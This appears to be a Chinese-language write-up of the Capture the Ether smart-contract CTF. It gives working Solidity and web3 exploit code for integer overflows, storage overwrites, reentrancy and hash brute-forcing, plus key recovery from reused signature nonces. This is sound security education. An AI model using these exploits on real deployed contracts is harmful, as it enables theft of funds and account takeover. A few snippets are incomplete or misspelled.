## Deploy a contract
![image](https://user-images.githubusercontent.com/118118760/223460455-645af028-aac9-4c26-8a1b-816c65241bda.png)
成功部署合约
## Call me
> (web3.utils.asciiToHex('RIPWU')).padEnd(64, '0')
'0x52495057550000000000000000000000000000000000000000000000000000'
## Guess the secret number
uint8取值空间极小[0,255],遍历查找
pragma solidity ^0.4.21;

contract ExploitGuessTheSecretNumberChallenge {
    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;

    function guess() public view returns (uint256) {
        for (uint8 n = 0; n < 255; n++) {
            if (keccak256(n) == answerHash) {
                return n;
            }
        }

        return 256;
    }
}
## Token sale
buy() 函数中的乘法存在溢出

async function main() {
    const targetAddress = '0x546a782986933ff853248E865cC0AFd9fb93a721';
    const targetABI = require('../build/contracts/TokenSaleChallenge.json').abi;
    const targetContract = new web3.eth.Contract(targetABI, targetAddress);

    //
    const Max = web3.utils.toBN("0x10000000000000000000000000000000000000000000000000000000000000000");
    const Ether = web3.utils.toBN(web3.utils.toWei('1'));
    const Zero = web3.utils.toBN('0');
    const One = web3.utils.toBN('1');

    const divmod = Max.divmod(Ether);

    //
    var numTokens = divmod.div.add(One);
    const value = numTokens.mul(Ether).sub(Max);

    await targetContract.methods.buy(numTokens).send({value});
    await targetContract.methods.sell(One).send();
}
## Token Whale
transferFrom() 检查的是外部传入的 from 的余额，而实际扣款扣的是 msg.sender，存在溢出

pragma solidity ^0.4.21;

import "./TokenWhaleChallenge.sol";

contract ExploitTokenWhaleChallenge {
    TokenWhaleChallenge public target = TokenWhaleChallenge(0x4E12fAB3CF4aF2E96863c26c0949CEE97b092350);
    address public owner;

    function ExploitTokenWhaleChallenge() public {
        owner = msg.sender;
        require(target.balanceOf(owner) == target.totalSupply());
    }

    function attack() public {
        address self = address(this);
        uint256 allowance = target.allowance(owner, self);
        require(allowance > 0);

        target.transferFrom(owner, owner, allowance);
        target.transfer(owner, 1000000);
        require(target.isComplete() == true);
    }
}
## Retirement fund
collectPenalty() 中的减法操作存在溢出，问题是合约没有显式的 payable receive() 或 payable fallback()
参考 Ethernaut #7 Force，通过 SELEDESTRUCT 强制发送 ETH 即可
## Mapping
类似 Ethernaut #19 Alien Codex，也是覆盖漏洞
> console.log('0x' + (2n ** 256n - BigInt(web3.utils.keccak256('0x' + '1'.padStart(64, '0')))).toString(16))
0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
## Donation
donate() 中 donation 定义时未指定引用，默认指向 slot0
对 donation 的修改会覆盖 slot0 和 slot1，即 donations.length 和 owner
## Fifty years
题目要求是将合约中的 ETH 全部取走
构造特定的 contribution，其 unlockTimestamp 足够小，通过 withdraw 函数的校验
令 head 为 0，使得调用 withdraw 函数时可以将所有 contribution 资金都取出
contribution.timestamp 会覆盖 head，将 1 和 2 结合起来，插入 timestamp 为 0 的 contribution

再次调用 upsert 构建 contribution2
// timestamp 设置为 0，等于 contribution1.unlockTimestamp + 1 days，可以通过 require 检查
contract.upsert(10, 0)
需要调用 contract.withdraw(1) 就可以取出合约内所有资金
## Fuzzy identity
构造一个合约，实现 name 接口且合约地址中包含 “badc0de”
合约地址得包含 “badc0de”
address = keccak(RLP([deployer, nonce]))[12:]
部署合约contract IdentifierHacker is IName {
    
    function name() external view override returns (bytes32) {
        return bytes32("smarx");
    }
    
    function auth(FuzzyIdentityChallenge c) public {
        c.authenticate();
    }
    
    function checkCompleted(FuzzyIdentityChallenge c) public view returns (bool) {
        return c.isComplete();
    }
}
## Public Key
找到 owner 的 publicKey
从 etherscan 上找到 owner 发送过的交易的 rawtx，可以从 rawtx 中得到签名和交易信息，有了交易信息、签名，就可以恢复出公钥
const EthereumTx = require('ethereumjs-tx').Transaction

const rawtx = '0xf87080843b9aca0083015f90946b477781b0e68031109f21887e6b5afeaaeb002b808c5468616e6b732c206d616e2129a0a5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7a05710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962'

let tx = new EthereumTx(rawtx, {chain: 'ropsten'})
let publicKey = tx.getSenderPublicKey().toString('hex')
console.log(publicKey
## Account takeover
得到 owner 的私钥
owner 发送的最早两笔交易，他们签名的 r 值是相同的
const EthereumTx = require('ethereumjs-tx').Transaction

const rawtx1 = '0xf86b80843b9aca008252089492b28647ae1f3264661f72fb2eb9625a89d88a31881111d67bb1bb00008029a069a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166a07724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8'
const rawtx2 = '0xf86b01843b9aca008252089492b28647ae1f3264661f72fb2eb9625a89d88a31881922e95bca330e008029a069a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166a02bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de'

let tx1 = new EthereumTx(rawtx1, {chain: 'ropsten'})
let tx2 = new EthereumTx(rawtx2, {chain: 'ropsten'})
console.log(tx1.r.toString('hex') === tx2.r.toString('hex')) // true
得到私钥后利用 owner 地址调用目标的 authenticate 方法
## Assume ownership
成为合约 owner
构造函数 typo，直接调用 AssumeOwmershipChallenge 函数成为 owner
## Token bank
把 TokenBankChallenge 合约中的代币取光
部署攻击合约
contract TokenBankHacker is ITokenReceiver {

    SimpleERC223Token token;
    TokenBankChallenge bank;
    address addr;
    
    function setParams(SimpleERC223Token _token, TokenBankChallenge _bank, address _addr) public {
        token = _token;
        bank = _bank;
        addr = _addr;
    }
    
    function withdraw(uint256 amount) public {
        bank.withdraw(amount);
    }
    
    function tokenFallback(address from, uint256 value, bytes data) external {
        if (from == addr) {
            token.transfer(address(bank), value, data);
        } else if (token.balanceOf(address(this)) < 1000000000000000000000000) {
            bank.withdraw(value);
        }
    }
}
从 bank 中 withdraw 到 player 地址
从 player 地址给攻击合约转账
通过攻击合约调用 bank.withdraw



